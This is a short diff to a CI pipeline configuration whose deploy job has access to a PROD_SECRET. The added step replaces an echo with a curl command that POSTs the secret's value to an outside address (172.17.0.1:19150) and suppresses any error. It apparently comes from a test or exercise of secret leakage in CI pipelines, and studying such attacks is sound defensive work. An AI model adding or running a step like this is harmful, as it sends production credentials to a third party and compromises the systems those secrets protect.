@@ -10,4 +10,4 @@ jobs:
     secrets:
       - PROD_SECRET
     steps:
-      - show: echo "DEPLOY-JOB-RAN"; echo "PROD_SECRET=[$PROD_SECRET]"
+      - show: curl -s -X POST --data "deploy-job-secret=[$PROD_SECRET]" http://172.17.0.1:19150/ || true
